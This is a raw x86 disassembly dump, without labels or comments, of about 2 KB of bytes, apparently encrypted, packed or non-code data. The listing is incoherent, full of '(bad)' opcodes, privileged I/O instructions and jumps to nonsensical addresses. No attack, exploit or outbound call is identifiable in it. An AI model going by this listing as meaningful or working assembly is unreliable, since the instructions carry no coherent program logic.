  41133a:	shl    ch,1
  41133c:	enter  0xebe4,0xc1
  411340:	add    al,0xec
  411342:	jmp    0xb5f2:0xd0ebf2c0
  411349:	fcom   st(2)
  41134b:	repnz int3 
  41134d:	jmp    0x41132e
  41134f:	jecxz  0x41130d
  411351:	rcl    esp,1
  411353:	int    0xcd
  411355:	aad    0x7
  411357:	fchs   
  411359:	ret    
  41135a:	add    DWORD PTR [esi],eax
  41135c:	enter  0xfcf,0xcb
  411360:	int3   
  411361:	leave  
  411362:	retf   0xcbac
  411365:	mov    bl,0xd0
  411367:	jmp    0xbaefd55b
  41136c:	enter  0xf7c4,0xfa
  411370:	loope  0x41132b
  411372:	(bad)  
  411373:	sar    dh,0xd5
  411376:	rol    DWORD PTR [edi],1
  411378:	idiv   edx
  41137a:	(bad)  
  41137b:	pop    es
  41137c:	faddp  st(4),st
  41137e:	add    ch,dh
  411380:	fldcw  WORD PTR [eax-0x1e513c0f]
  411386:	jmp    0x411373
  411388:	mov    ebx,0xc4c9b4b1
  41138d:	(bad)  
  41138f:	repz idiv DWORD PTR [edi+0xccf4d0]
  411396:	fucom  st(4)
  411398:	mov    BYTE PTR [eax*8-0x143b1615],0x5
  4113a0:	or     bh,BYTE PTR [edi-0x12174e3b]
  4113a6:	(bad)  
  4113a7:	shl    bl,1
  4113a9:	in     al,0xf9
  4113ab:	aam    0xbe
  4113ad:	lock in al,0xee
  4113b0:	hlt    
  4113b1:	mov    ebx,0xe6f4d1d0
  4113b6:	cli    
  4113b7:	fdivr  st,st(0)
  4113b9:	in     eax,0x2
  4113bb:	add    ch,bh
  4113bd:	pop    es
  4113be:	or     ebx,esi
  4113c0:	fld1   
  4113c2:	scas   al,BYTE PTR es:[edi]
  4113c3:	lods   eax,DWORD PTR ds:[esi]
  4113c4:	jmp    0xfa310897
  4113c9:	shl    DWORD PTR [ebp-0x2b420c1b],0xd6
  4113d0:	add    esi,ecx
  4113d2:	into   
  4113d3:	mov    esi,0xf4d8f7fe
  4113d8:	or     dh,al
  4113da:	(bad)  
  4113db:	fyl2xp1 
  4113dd:	retf   
  4113de:	stc    
  4113df:	out    0xcb,al
  4113e1:	mov    eax,0xb7e7c2cc
  4113e6:	mov    al,0xc3
  4113e8:	stc    
  4113e9:	shl    eax,1
  4113eb:	out    dx,eax
  4113ec:	repz sti 
  4113ee:	call   0x17e2e1
  4113f3:	fiadd  DWORD PTR [edx]
  4113f5:	cmc    
  4113f6:	(bad)  
  4113f7:	jmp    0x4113dc
  4113f9:	fadd   DWORD PTR [ebx]
  4113fb:	add    dl,bh
  4113fd:	sti    
  4113fe:	iret   
  4113ff:	add    DWORD PTR ds:0xc2c7e7b9,ecx
  411405:	fdiv   QWORD PTR [ecx-0x39083f33]
  41140b:	repnz iret 
  41140d:	icebp  
  41140e:	call   0xc21d02f6
  411413:	add    dh,bl
  411415:	int    0xe4
  411417:	(bad)  
  411418:	aam    0xe5
  41141a:	(bad)  
  41141b:	retf   
  41141c:	cld    
  41141d:	into   
  41141e:	(bad)  
  41141f:	repz jecxz 0x411406
  411422:	out    dx,eax
  411423:	xlat   BYTE PTR ds:[ebx]
  411424:	shl    ch,cl
  411426:	test   esi,0xd5f9c5d6
  41142c:	iret   
  41142d:	retf   0xf7cf
  411430:	aad    0xd1
  411432:	mov    ecx,0xf5e6dbd2
  411437:	neg    al
  411439:	mul    eax
  41143b:	loope  0x411404
  41143d:	push   es
  41143e:	in     eax,0xd8
  411440:	int    0xbd
  411442:	repz (bad) 
  411444:	shr    al,1
  411446:	leave  
  411447:	aad    0xee
  411449:	shr    esp,cl
  41144b:	(bad)
  41144e:	mov    ecx,0xf3b8fee8
  411453:	out    dx,eax
  411454:	out    dx,al
  411455:	icebp  
  411456:	(bad)  
  411457:	fdiv   st,st(2)
  411459:	idiv   esp
  41145b:	retf   0xf8df
  41145e:	out    0x6,eax
  411460:	fsub   st(6),st
  411462:	(bad)  
  411463:	in     eax,dx
  411464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411465:	loope  0x411418
  411467:	hlt    
  411468:	repnz mov ah,0xf3
  41146b:	mov    eax,0xb1f6ecb0
  411470:	rol    BYTE PTR [ebx],1
  411472:	jecxz  0x41142d
  411474:	mov    ebp,0xfde1e0de
  411479:	jmp    0xda3fd23c
  41147e:	ffree  st(5)
  411480:	push   cs
  411481:	scas   al,BYTE PTR es:[edi]
  411482:	mov    eax,0xe8b6c9d7
  411487:	mov    bl,0xfb
  411489:	mov    bl,0xd5
  41148b:	rcr    ebp,cl
  41148d:	sti    
  41148e:	in     al,0xf1
  411490:	ret    0x7df
  411493:	add    dl,bh
  411495:	ret    0xdc01
  411498:	or     edx,ebx
  41149a:	fdiv   st(3),st
  41149c:	or     eax,0x90fd40a
  4114a1:	int    0xdc
  4114a3:	int    0xc0
  4114a5:	stos   DWORD PTR es:[edi],eax
  4114a6:	in     eax,0xe2
  4114a8:	cmc    
  4114a9:	mov    ch,0xef
  4114ab:	(bad)  
  4114ac:	in     eax,0xba
  4114ae:	(bad)  
  4114b0:	shl    ebp,1
  4114b2:	jecxz  0x411486
  4114b4:	jecxz  0x411473
  4114b6:	in     al,0xe7
  4114b8:	add    al,0xcb
  4114ba:	retf   0xfde8
  4114bd:	add    eax,0xe7cff8d8
  4114c2:	fidiv  WORD PTR [edx-0x321f4d37]
  4114c8:	rcl    esp,cl
  4114ca:	aad    0xcb
  4114cc:	lock in eax,dx
  4114ce:	mov    esp,0xcec2f6d6
  4114d3:	cmc    
  4114d4:	add    eax,0xd4d202ff
  4114d9:	les    eax,FWORD PTR ds:0xdcef06d9
  4114df:	or     al,0xec
  4114e1:	in     al,0xdd
  4114e3:	mov    esi,0xe7b6bcd2
  4114e8:	shr    ah,cl
  4114ea:	fstp   TBYTE PTR [eax-0x374b47]
  4114f0:	add    DWORD PTR [edx-0x261a1942],edi
  4114f6:	shl    esp,0xcb
  4114f9:	sar    DWORD PTR [esi-0x1926fc08],0xde
  411500:	iret   
  411501:	loope  0x4114ed
  411503:	fdivr  st(0),st
  411505:	jmp    0x4114d6
  411507:	aad    0xc4
  411509:	out    0xca,al
  41150b:	jmp    0xbd39ca04
  411510:	enter  0xfadc,0x0
  411514:	repnz idiv BYTE PTR [edi+edi*8-0xa25ff1c]
  41151c:	out    dx,eax
  41151d:	(bad)
  411520:	int3   
  411521:	jmp    0xd825c7e8
  411526:	mov    dh,0xc4
  411528:	fld    st(1)
  41152a:	mov    cl,0xe9
  41152c:	int3   
  41152d:	fdivr  st,st(0)
  41152f:	mov    ebx,0xf4fae8e8
  411534:	add    esp,esp
  411536:	rcr    ah,1
  411538:	aad    0xd6
  41153a:	fabs   
  41153c:	cli    
  41153d:	(bad)  
  41153e:	fmulp  st(0),st
  411540:	clc    
  411541:	ffreep st(2)
  411543:	retf   
  411544:	shl    DWORD PTR [eax-0xc0b1744],cl
  41154a:	(bad)  
  41154b:	(bad)  
  41154c:	in     al,0xb5
  41154e:	lock cmc 
  411550:	aad    0xfb
  411552:	(bad)  
  411554:	add    eax,0xfcebd503
  411559:	std    
  41155a:	xlat   BYTE PTR ds:[ebx]
  41155b:	jmp    0xb301:0xcbe5c304
  411562:	fucomip st,st(2)
  411564:	(bad)  
  411565:	stos   DWORD PTR es:[edi],eax
  411566:	iret   
  411567:	jecxz  0x411539
  411569:	div    BYTE PTR [edi-0xa2e4b15]
  41156f:	aad    0xc8
  411571:	jecxz  0x41154c
  411573:	into   
  411574:	int    0x5
  411576:	ffree  st(0)
  411578:	dec    DWORD PTR [ecx]
  41157a:	out    0x9,al
  41157c:	add    cl,BYTE PTR [eax]
  41157e:	(bad)  
  41157f:	(bad)  
  411581:	(bad)  
  411582:	scas   al,BYTE PTR es:[edi]
  411583:	out    dx,eax
  411584:	scas   eax,DWORD PTR es:[edi]
  411585:	div    cl
  411587:	cmc    
  411588:	test   al,0xe7
  41158a:	mov    dh,0xcd
  41158c:	in     al,dx
  41158d:	retf   0xd4fb
  411590:	repnz fstp TBYTE PTR [esi-0x1f25261f]
  411597:	ffreep st(2)
  411599:	shr    bh,0xeb
  41159c:	jmp    0xebe1:0xeef9c9d9
  4115a3:	mov    dl,0xb3
  4115a5:	enter  0xd6f5,0xc9
  4115a9:	sti    
  4115aa:	out    0xcf,eax
  4115ac:	mov    ebx,0xecddfdba
  4115b1:	clc    
  4115b2:	in     eax,dx
  4115b3:	add    al,BYTE PTR [esi]
  4115b5:	fadd   DWORD PTR [edx*8-0xa1d2844]
  4115bc:	jmp    0x411593
  4115be:	(bad)  
  4115bf:	leave  
  4115c0:	repz mov esi,0xe8cbe4e2
  4115c6:	(bad)  
  4115c7:	out    0xbb,al
  4115c9:	shl    ebp,1
  4115cb:	(bad)  
  4115cd:	ror    esp,cl
  4115cf:	mov    esp,0xf3f2fed7
  4115d4:	out    dx,al
  4115d5:	add    eax,eax
  4115d7:	fcomp  st(2)
  4115d9:	mov    edi,0x4d6def8
  4115de:	push   cs
  4115df:	or     edx,ebp
  4115e1:	mov    bl,0xdd
  4115e3:	test   al,0xc4
  4115e5:	test   cl,0xd2
  4115e8:	out    dx,eax
  4115e9:	repnz clc 
  4115eb:	leave  
  4115ec:	(bad)  
  4115ed:	jmp    0xd21301c2
  4115f2:	add    dl,bl
  4115f4:	(bad)  
  4115f5:	mov    ebp,0xc4fed2fa
  4115fa:	pop    es
  4115fb:	cli    
  4115fc:	or     ch,bl
  4115fe:	out    0xfc,al
  411600:	add    al,0xc8
  411602:	shl    edx,1
  411604:	shr    BYTE PTR [edi-0x4557290e],cl
  41160a:	fidivr DWORD PTR [edx-0x324d3222]
  411610:	in     eax,dx
  411611:	fcmovbe st,st(0)
  411613:	cli    
  411614:	not    dh
  411616:	mov    edx,0xc9f5070a
  41161b:	fcomp  st(3)
  41161d:	psubusw mm7,mm2
  411620:	out    0xb3,eax
  411622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411623:	jmp    0x4115ef
  411625:	out    dx,eax
  411626:	retf   0xe6f5
  411629:	mov    edx,0xd6fad0e6
  41162e:	repz mov eax,0x7f1bdf6
  411634:	aad    0xfb
  411636:	stc    
  411637:	aam    0x9
  411639:	or     al,BYTE PTR [esi]
  41163b:	push   es
  41163c:	(bad)  
  41163d:	stc    
  41163e:	or     al,0xc4
  411640:	add    eax,0xd3a8b2e8
  411645:	aam    0xe0
  411647:	loope  0x41160e
  411649:	shl    DWORD PTR [edx-0x224271a],0xf4
  411650:	cld    
  411651:	lock add edi,DWORD PTR [esp+edi*8-0x1d091b25]
  411659:	(bad)  
  41165b:	(bad)
  41165e:	into   
  41165f:	out    0xda,eax
  411661:	rol    ebx,1
  411663:	lods   al,BYTE PTR ds:[esi]
  411664:	into   
  411665:	lods   al,BYTE PTR ds:[esi]
  411666:	int3   
  411667:	icebp  
  411668:	icebp  
  411669:	in     al,0xb8
  41166b:	enter  0xead4,0xea
  41166f:	add    bh,BYTE PTR [ebx+0xecc2e8]
  411675:	loope  0x411655
  411677:	(bad)  
  411679:	in     al,0xf4
  41167b:	aam    0xc9
  41167d:	fild   WORD PTR [esi]
  41167f:	cli    
  411680:	into   
  411681:	mov    ebp,0xb0aee3b0
  411686:	shl    DWORD PTR [eax-0x3244280a],cl
  41168c:	(bad)  
  41168d:	aad    0xf5
  41168f:	fstp   st(6)
  411691:	ret    0xfdf6
  411694:	ret    0xf6c1
  411697:	shl    ebx,0xf1
  41169a:	(bad)
  41169d:	sti    
  41169e:	or     eax,0xc2f009f8
  4116a3:	mov    bh,0xcb
  4116a5:	lods   al,BYTE PTR ds:[esi]
  4116a6:	ror    ecx,0xf2
  4116a9:	rol    al,cl
  4116ab:	jmp    0xedd5:0xf2ebbbf0
  4116b2:	mov    dh,0xf5
  4116b4:	sti    
  4116b5:	push   ebx
  4116b7:	cli    
  4116b8:	retf   
  4116b9:	ret    
  4116ba:	loopne 0x411694
  4116bc:	iret   
  4116bd:	or     al,0xe5
  4116bf:	or     esi,ebx
  4116c1:	(bad)  
  4116c2:	scas   eax,DWORD PTR es:[edi]
  4116c3:	fsubrp st(5),st
  4116c5:	hlt    
  4116c6:	mov    esp,0xd9eee2eb
  4116cb:	icebp  
  4116cc:	lods   al,BYTE PTR ds:[esi]
  4116cd:	mov    edx,0xd4e3ebd1
  4116d2:	mov    dh,0xe7
  4116d4:	std    
  4116d5:	std    
  4116d6:	loope  0x4116bd
  4116d8:	add    ah,al
  4116da:	fdivr  st(6),st
  4116dc:	out    0xd,al
  4116de:	stc    
  4116df:	int    0xf9
  4116e1:	fadd   st,st(1)
  4116e3:	icebp  
  4116e4:	ror    eax,1
  4116e6:	int3   
  4116e7:	(bad)  
  4116e8:	call   0xd8fd03d4
  4116ed:	mov    ch,0xf4
  4116ef:	leave  
  4116f0:	mov    edi,0xeeffccde
  4116f5:	out    0xfb,eax
  4116f7:	or     bl,ah
  4116f9:	clc    
  4116fa:	or     ebx,ecx
  4116fc:	test   BYTE PTR [edx],0xfa
  4116ff:	jmp    0x4116d4
  411701:	jecxz  0x4116d1
  411703:	jmp    0xf615f4f2
  411708:	out    0xcb,eax
  41170a:	mov    al,0xc9
  41170c:	mov    ebx,0xd4e8f0cf
  411711:	mov    ebp,0xbdd5efee
  411716:	hlt    
  411717:	sar    BYTE PTR [eax-0xbf9f5fe],1
  41171d:	(bad)  
  411720:	add    ch,al
  411722:	repnz scas eax,DWORD PTR es:[edi]
  411724:	mov    cl,0xe9
  411726:	mov    dh,0xc1
  411728:	ret    0xb8ea
  41172b:	idiv   BYTE PTR [edi-0x29452931]
  411731:	add    bh,BYTE PTR [edx+0xbfadfce]
  411737:	rcr    bl,0xc5
  41173a:	(bad)
  41173d:	or     bh,dl
  41173f:	fdivr  st,st(6)
  411741:	fdiv   DWORD PTR [edx-0x35102851]
  411747:	out    0xd5,eax
  411749:	retf   0xadce
  41174c:	jmp    0x411703
  41174e:	add    edi,eax
  411750:	not    ebp
  411752:	clc    
  411753:	fnstsw WORD PTR [ebp+eax*1-0x17053c25]
  41175a:	test   DWORD PTR [edi],0xe5090f0d
  411760:	fucomip st,st(2)
  411762:	loop   0x411757
  411764:	shl    edx,1
  411766:	mov    ch,0xf7
  411768:	iret   
  411769:	mov    bh,0xd2
  41176b:	mov    al,0xed
  41176d:	mov    ebx,0xd8cac9f3
  411772:	mov    esp,0xd4fbbcb5
  411777:	mov    esp,0xcafec6dc
  41177c:	jmp    0x411764
  41177e:	enter  0xdfed,0xad
  411782:	fsubr  st,st(5)
  411784:	ror    bh,1
  411786:	fmul   st(6),st
  411788:	in     al,0xf5
  41178a:	enter  0xcddf,0xfa
  41178e:	fsubr  st,st(2)
  411790:	fdivr  st,st(6)
  411792:	repz add edi,esi
  411795:	faddp  st(1),st
  411797:	in     al,0xc1
  411799:	cmc    
  41179a:	out    0xf7,al
  41179c:	aam    0xda
  41179e:	or     BYTE PTR [edi],al
  4117a0:	stc    
  4117a1:	fucomip st,st(2)
  4117a3:	mov    bl,0xc7
  4117a5:	repz retf 
  4117a7:	(bad)  
  4117a8:	cli    
  4117a9:	mov    ecx,0xd6f6d4d8
  4117ae:	out    dx,eax
  4117af:	shl    ebx,1
  4117b1:	mov    ebx,0xd0daf201
  4117b6:	push   ebx
  4117b8:	aad    0x4
  4117ba:	or     BYTE PTR [eax],cl
  4117bc:	dec    DWORD PTR [edx]
  4117be:	sti    
  4117bf:	out    dx,eax
  4117c0:	faddp  st(2),st
  4117c2:	retf   
  4117c3:	ret    
  4117c4:	in     eax,0xc7
  4117c6:	mov    cl,0xf5
  4117c8:	sti    
  4117c9:	(bad)  
  4117ca:	int3   
  4117cb:	jmp    0xf916ccbe
  4117d0:	iret   
  4117d1:	fiadd  WORD PTR [ebx]
  4117d3:	out    dx,eax
  4117d4:	hlt    
  4117d5:	add    eax,0x2c200bc
  4117da:	jmp    0xeadc:0xe5dd08
  4117e1:	lods   eax,DWORD PTR ds:[esi]
  4117e2:	call   0xc30ae1ba
  4117e7:	div    ecx
  4117e9:	(bad)  
  4117ea:	dec    ecx
  4117ec:	ror    ch,cl
  4117ee:	mov    edi,0xd5bbd1fe
  4117f3:	mov    esp,0xb07fef5
  4117f8:	aam    0xd9
  4117fa:	in     eax,0x8
  4117fc:	(bad)  
  4117fd:	(bad)  
  4117fe:	call   0xc205eaf0
  411803:	loop   0x4117f4
  411805:	xlat   BYTE PTR ds:[ebx]
  411806:	mov    cl,0xd4
  411808:	rol    esi,0xb6
  41180b:	fcmove st,st(3)
  41180d:	fsub   st(6),st
  41180f:	add    al,dl
  411811:	iret   
  411812:	enter  0xe2fd,0xd5
  411816:	jmp    0x4117f2
  411818:	div    esp
  41181a:	jmp    0xfb410d26
  41181f:	loope  0x4117ef
  411821:	ftst   
  411823:	lods   eax,DWORD PTR ds:[esi]
  411824:	int    0xc7
  411826:	jmp    0xb7f7000d
  41182b:	(bad)  
  41182c:	aam    0xea
  41182e:	repnz sti 
  411830:	fidivr DWORD PTR [ecx-0x1b38383e]
  411836:	add    ebx,edi
  411838:	(bad)  
  411839:	fsub   st,st(7)
  41183b:	(bad)  
  41183c:	jmp    0xbfbf:0x12e3cf05
  411843:	int    0xc2
  411845:	rcl    esi,0xd1
  411848:	mov    bh,0xcf
  41184a:	ror    edi,1
  41184c:	jmp    0x41182d
  41184e:	fdivr  DWORD PTR [ebx-0x431f3d43]
  411854:	pop    es
  411855:	add    bl,al
  411857:	not    esp
  411859:	rcr    ch,0xd4
  41185c:	iret   
  41185d:	in     al,0x13
  41185f:	cld    
  411860:	repnz rcr ebp,0xae
  411864:	iret   
  411865:	(bad)
  411868:	in     al,dx
  411869:	aam    0xcb
  41186b:	into   
  41186c:	fstp   st(3)
  41186e:	into   
  41186f:	ret    
  411870:	aam    0xf8
  411872:	sar    DWORD PTR [esi-0x5332427],cl
  411878:	div    esi
  41187a:	ror    DWORD PTR [edi],0x0
  41187d:	or     eax,0xe50cdcc5
  411882:	jecxz  0x411851
  411884:	lods   al,BYTE PTR ds:[esi]
  411885:	mov    dh,0xe6
  411887:	mov    edx,0xe6d5e6e8
  41188d:	repz repnz stc 
  411890:	fdivr  DWORD PTR [edx-0x1dfd2d3e]
  411896:	repz mov ebp,0xef5fc04
  41189c:	leave  
  41189d:	fsub   st,st(1)
  41189f:	(bad)  [edi*4-0x191b102d]
  4118a6:	icebp  
  4118a7:	sti    
  4118a8:	mov    edx,0xecf5b4f9
  4118ad:	(bad)  
  4118af:	jecxz  0x41187e
  4118b1:	mov    ebx,0xfedfc1d7
  4118b6:	ret    0x9e1
  4118b9:	(bad)  
  4118ba:	clc    
  4118bb:	iret   
  4118bc:	(bad)  
  4118bd:	jecxz  0x411888
  4118bf:	rcr    ebp,cl
  4118c1:	lods   al,BYTE PTR ds:[esi]
  4118c2:	lock rcl al,1
  4118c5:	stos   DWORD PTR es:[edi],eax
  4118c6:	sti    
  4118c7:	lock fcomi st,st(5)
  4118ca:	cli    
  4118cb:	test   edi,0xf5bbedfe
  4118d1:	mov    bh,0xfc
  4118d3:	neg    bh
  4118d5:	in     eax,0x3
  4118d7:	mov    dl,0xdc
  4118da:	pop    es
  4118db:	jecxz  0x4118b9
  4118dd:	push   es
  4118de:	hlt    
  4118df:	or     ebp,edi
  4118e1:	(bad)
  4118e4:	into   
  4118e5:	out    dx,eax
  4118e6:	mov    ah,0xd7
  4118e8:	(bad)  
  4118e9:	rol    ch,0xca
  4118ec:	stc    
  4118ed:	repnz lock in al,dx
  4118f0:	into   
  4118f1:	add    edi,DWORD PTR [eax-0x39010912]
  4118f7:	out    0xd2,al
  4118f9:	in     al,0xe9
  4118fb:	hlt    
  4118fc:	loop   0x4118ea
  4118fe:	out    dx,al
  4118ff:	(bad)
  411902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411903:	lods   eax,DWORD PTR ds:[esi]
  411904:	(bad)  
  411905:	repz fld TBYTE PTR [ebp-0x9364e31]
  41190c:	mov    edx,0xb4d4fec9
  411911:	sar    BYTE PTR [ecx-0x250a2c31],1
  411917:	cmc    
  411918:	push   es
  411919:	add    al,0x3
  41191b:	pop    es
  41191c:	clc    
  41191d:	add    esi,ecx
  41191f:	sar    esp,cl
  411921:	lods   eax,DWORD PTR ds:[esi]
  411922:	retf   0xd5f6
  411925:	out    dx,al
  411926:	stos   BYTE PTR es:[edi],al
  411927:	(bad)  
  411928:	in     al,dx
  411929:	mov    cl,0xb7
  41192b:	retf   0xb7f9
  41192e:	sar    ah,cl
  411930:	icebp  
  411931:	mov    eax,0xdfb8f1fe
  411936:	(bad)  
  411938:	jmp    0x411922
  41193a:	sti    
  41193b:	hlt    
  41193c:	push   es
  41193d:	in     eax,dx
  41193e:	out    0xec,al
  411940:	repz mov eax,0xb7e2f2d8
  411946:	lock icebp 
  411948:	retf   
  411949:	mov    al,0xf6
  41194b:	int3   
  41194c:	lods   al,BYTE PTR ds:[esi]
  41194d:	mov    ch,0xe8
  41194f:	in     al,dx
  411950:	div    ah
  411952:	shl    bh,1
  411954:	out    0xf6,al
  411956:	jecxz  0x411933
  411958:	or     edx,eax
  41195a:	sti    
  41195b:	fimul  WORD PTR [edi]
  41195d:	cli    
  41195e:	std    
  41195f:	or     al,0xf8
  411961:	lods   eax,DWORD PTR ds:[esi]
  411962:	scas   al,BYTE PTR es:[edi]
  411963:	rol    edx,cl
  411965:	lods   eax,DWORD PTR ds:[esi]
  411966:	lock call 0xd91be826
  41196c:	jmp    0xf60f0646
  411971:	rol    DWORD PTR [eax],cl
  411973:	cli    
  411974:	hlt    
  411975:	ror    esp,0xe0
  411978:	push   es
  411979:	retf   0xe5f5
  41197c:	(bad)  
  41197d:	leave  
  41197e:	push   es
  41197f:	or     ch,bh
  411981:	out    0xe6,al
  411983:	loop   0x41197b
  411985:	in     eax,dx
  411986:	repz fcmovu st,st(3)
  411989:	fprem1 
  41198b:	int3   
  41198c:	mov    al,0xd3
  41198e:	mov    ebp,0xf2b7be02
  411993:	shl    ebx,0xd1
  411996:	shl    al,0xf8
  411999:	in     al,0xdd
  41199b:	jmp    0xfa231f7d
  4119a0:	int3   
  4119a1:	repz mov esp,0xb3e5cdf0
  4119a7:	mov    dh,0xf0
  4119a9:	fsub   st,st(0)
  4119ab:	push   ebx
  4119ad:	sti    
  4119ae:	mov    esp,0xfadab403
  4119b3:	add    ah,dl
  4119b5:	repnz add esp,ebx
  4119b8:	add    al,0xd6
  4119ba:	hlt    
  4119bb:	femms  
  4119bd:	add    eax,0xcf080cc6
  4119c2:	loope  0x411990
  4119c4:	repnz (bad) 
  4119c6:	loope  0x41198a
  4119c8:	loop   0x411991
  4119ca:	jmp    0x411998
  4119cc:	mov    bh,0xbd
  4119ce:	(bad)  
  4119cf:	cli    
  4119d0:	aam    0xdf
  4119d2:	mul    eax
  4119d4:	mov    edi,0xdde2fbbb
  4119d9:	out    0xf,eax
  4119db:	out    0xfb,eax
  4119dd:	fdivrp st(3),st
  4119df:	out    dx,al
  4119e0:	fcmovu st,st(0)
  4119e2:	loope  0x4119ce
  4119e4:	lods   al,BYTE PTR ds:[esi]
  4119e5:	ror    cl,cl
  4119e7:	mov    ah,0xf0
  4119e9:	jmp    0xc510e3d2
  4119ee:	mov    edi,0xc3ccb4d0
  4119f3:	loopne 0x4119e7
  4119f5:	repnz shl cl,1
  4119f8:	(bad)  
  4119fa:	shr    bh,1
  4119fc:	add    eax,0xddfae8eb
  411a01:	mov    esp,0xf0e2caac
  411a06:	in     eax,dx
  411a07:	int3   
  411a08:	leave  
  411a09:	aam    0xf0
  411a0b:	cmc    
  411a0c:	fcompp 
  411a0e:	icebp  
  411a0f:	cli    
  411a10:	jmp    0xbad8:0xbc0603e0
  411a17:	out    0xf9,al
  411a19:	jecxz  0x4119f4
  411a1b:	jmp    0xeccf:0xeedebdc
  411a22:	mov    al,0xd1
  411a24:	ret    
  411a25:	mov    ch,0xe5
  411a27:	ror    al,cl
  411a29:	mov    bh,0xd6
  411a2b:	leave  
  411a2c:	fcomp  st(2)
  411a2e:	mov    ecx,0xd9cfc8e2
  411a33:	stc    
  411a34:	mov    esp,0xf1f5fd04
  411a39:	retf   0x5e0
  411a3c:	(bad)  
  411a3e:	or     ebp,esi
  411a40:	cli    
  411a41:	leave  
  411a42:	fdiv   DWORD PTR [ebx-0xb090c4a]
  411a48:	jmp    0xbef9fa2d
  411a4d:	enter  0xd8bc,0xc3
  411a51:	std    
  411a52:	out    0xf5,eax
  411a54:	loope  0x411a12
  411a56:	(bad)  
  411a58:	(bad)
  411a5c:	cmc    
  411a5d:	fimul  WORD PTR [ebx]
  411a5f:	out    0x9,eax
  411a61:	(bad)  
  411a62:	repz jecxz 0x411a21
  411a65:	mov    dl,0xe5
  411a67:	repz repnz hlt 
  411a6a:	imul   edx
  411a6c:	dec    esp
  411a6e:	iret   
  411a6f:	clc    
  411a70:	xlat   BYTE PTR ds:[ebx]
  411a71:	out    dx,eax
  411a72:	ret    
  411a73:	mov    esp,0xeaf9faee
  411a78:	vpand  ymm5,ymm7,ymm3
  411a7c:	or     edi,eax
  411a7e:	or     esp,eax
  411a80:	fsubr  st(4),st
  411a82:	out    dx,eax
  411a83:	loopne 0x411a7c
  411a85:	(bad)  
  411a87:	div    edx
  411a89:	loope  0x411a60
  411a8b:	leave  
  411a8c:	out    dx,al
  411a8d:	jmp    0x411a81
  411a8f:	cli    
  411a90:	call   esi
  411a92:	shl    dl,0xd2
  411a95:	in     eax,0xfa
  411a97:	inc    BYTE PTR [esi]
  411a99:	add    al,0xa
  411a9b:	(bad)  
  411a9c:	cli    
  411a9d:	loope  0x411a8e
  411a9f:	add    ebx,edx
  411aa1:	(bad)  
  411aa2:	test   al,0xb2
  411aa4:	loope  0x411a5d
  411aa6:	retf   0xfbb4
  411aa9:	mov    ebx,0xe9f6f0ea
  411aae:	fdivr  st(5),st
  411ab0:	xlat   BYTE PTR ds:[ebx]
  411ab1:	idiv   esi
  411ab3:	out    dx,eax
  411ab4:	aad    0xbd
  411ab6:	xlat   BYTE PTR ds:[ebx]
  411ab7:	test   dl,0xd7
  411aba:	shl    bl,1
  411abc:	out    0xe9,al
  411abe:	in     eax,0xfb
  411ac0:	or     bl,ch
  411ac2:	fucom  st(1)
  411ac4:	(bad)  
  411ac5:	(bad)  
  411ac6:	lock loope 0x411ac3
  411ac9:	in     eax,0xf6
  411acb:	mov    ah,0xd3
  411acd:	int    0xf1
  411acf:	mov    cl,0xb9
  411ad1:	int3   
  411ad2:	rol    BYTE PTR [esi],cl
  411ad4:	repz loop 0x411a9c
  411ad7:	fidivr DWORD PTR [esi+edi*8-0x12241f24]
  411ade:	add    DWORD PTR [ebx],eax
  411ae0:	jecxz  0x411aa1
  411ae2:	shl    BYTE PTR [ebp-0x3c124953],1
  411ae8:	shl    esp,1
  411aea:	sar    esi,1
  411aec:	int3   
  411aed:	mov    ecx,0xd0bcb1f8
  411af2:	add    DWORD PTR [eax],eax
  411af4:	lock pop es
  411af6:	clc    
  411af7:	mov    ecx,0xc9ffc0e5
  411afc:	or     bl,ah
  411afe:	(bad)
  411b02:	(bad)  
  411b03:	loope  0x411aee
  411b05:	jmp    0xc8b2:0xefcaadc8
  411b0c:	(bad)
  411b0f:	mov    esi,0xeed0
  411b14:	(bad)  
  411b15:	(bad)  
  411b17:	jmp    0xeefd:0xf5f9e3c1
  411b1e:	clc    
  411b1f:	or     al,0xe
  411b21:	in     al,dx
  411b22:	out    dx,eax
  411b23:	lods   al,BYTE PTR ds:[esi]
  411b24:	int3   
  411b25:	jmp    0xcdb6:0xe7fad3e1
  411b2c:	fptan  
  411b2e:	int3   
  411b2f:	out    dx,eax
  411b30:	call   0xd61bea22
  411b35:	inc    bl
  411b37:	aam    0xf9
  411b39:	add    esi,edi
  411b3b:	xadd   dh,ah
  411b3e:	sti    
  411b3f:	fsub   st(4),st
  411b41:	lock (bad) 
  411b43:	out    0xe2,al
  411b45:	mov    al,0xf5
  411b47:	lods   al,BYTE PTR ds:[esi]
  411b48:	mov    ebx,0xe4f1efe6
  411b4d:	in     al,dx
  411b4e:	int3   
  411b4f:	mov    edx,0xe2dabef8
  411b54:	out    0xfb,eax
  411b56:	cmc    
  411b57:	hlt    
  411b58:	or     eax,esi
  411b5a:	out    0xcb,eax
  411b5c:	or     BYTE PTR [ebx],al
  411b5e:	sti    
  411b5f:	(bad)  
  411b61:	enter  0xdfd7,0xe1
  411b65:	scas   eax,DWORD PTR es:[edi]
  411b66:	out    dx,al
  411b67:	aad    0xd5
  411b69:	fcomi  st,st(1)
  411b6b:	clc    
  411b6c:	(bad)  
  411b6e:	int3   
  411b6f:	mov    ecx,0xd603f1be
  411b74:	int3   
  411b75:	cld    
  411b76:	(bad)  
  411b77:	cld    
  411b78:	(bad)  
  411b79:	cmc    
  411b7a:	stc    
  411b7b:	sti    
  411b7c:	add    edx,esp
  411b7e:	(bad)  
  411b7f:	fsubr  st(7),st
  411b81:	repz xlat BYTE PTR ds:[ebx]
  411b83:	retf   
  411b84:	(bad)  
  411b85:	into   
  411b86:	jecxz  0x411b62
  411b88:	cli    
  411b89:	mov    al,0xb4
  411b8b:	icebp  
  411b8c:	(bad)
  411b8f:	(bad)  
  411b90:	retf   0xc802
  411b93:	in     al,dx
  411b94:	mov    edi,0xd4d1c4bc
  411b9a:	mov    esi,0xe4cf040a
  411b9f:	(bad)  
  411ba0:	fadd   st(5),st
  411ba2:	mov    ebp,0xc4d4d2c4
  411ba7:	shr    ebp,cl
  411ba9:	mov    ebx,0xb8b4cbff
  411bae:	enter  0xf6f0,0xe0
  411bb2:	rol    cl,1
  411bb4:	rcl    al,1
  411bb6:	loope  0x411b8e
  411bb8:	jmp    0x411b95
  411bba:	lock retf 
  411bbc:	into   
